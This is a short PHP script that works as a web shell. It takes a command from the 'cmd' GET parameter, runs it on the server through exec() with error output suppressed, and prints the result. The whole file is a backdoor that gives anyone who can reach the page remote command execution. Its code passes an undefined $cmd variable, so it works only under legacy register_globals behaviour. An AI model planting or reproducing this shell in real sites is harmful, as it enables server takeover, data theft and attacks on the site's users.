<?php
function ekse($cmd){
	if(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
}

if(isset($_GET['cmd'])){
	$result = ekse($cmd);
	echo $result;
}
	
?>